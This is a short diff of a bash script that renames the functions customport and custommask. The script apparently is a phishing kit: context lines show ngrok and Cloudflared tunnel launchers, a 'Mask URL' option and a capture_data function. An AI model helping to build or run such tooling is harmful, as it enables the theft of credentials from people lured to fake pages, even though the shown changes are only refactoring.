@@ -342,7 +342,7 @@ HOST='127.0.0.1'
 PORT='8080'
 
 ## Choose custom port
-customport() {
+custom_port() {
 	echo
 	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want A Custom Port ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}]: ${ORANGE}" P_ANS
 	if [[ ${P_ANS} =~ ^([yY])$ ]]; then
@@ -361,7 +361,7 @@ customport() {
 }
 
 ## Custom Mask URL
-custommask() {
+custom_mask() {
 	{ sleep .5; clear; banner_small; echo; }
 	read -n1 -p "${RED}[${WHITE}?${RED}]${ORANGE} Do You Want To Change Mask URL? ${GREEN}[${CYAN}y${GREEN}/${CYAN}N${GREEN}] :${ORANGE} " mask_op
 	echo
@@ -470,7 +470,7 @@ capture_data() {
 
 ## Start ngrok
 start_ngrok() {
-	customport
+	custom_port
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Ngrok..."
@@ -496,7 +496,7 @@ start_ngrok() {
 ## Start Cloudflared
 start_cloudflared() { 
         rm .cld.log > /dev/null 2>&1 &
-	customport
+	custom_port
 	echo -e "\n${RED}[${WHITE}-${RED}]${GREEN} Initializing... ${GREEN}( ${CYAN}http://$HOST:$PORT ${GREEN})"
 	{ sleep 1; setup_site; }
 	echo -ne "\n\n${RED}[${WHITE}-${RED}]${GREEN} Launching Cloudflared..."
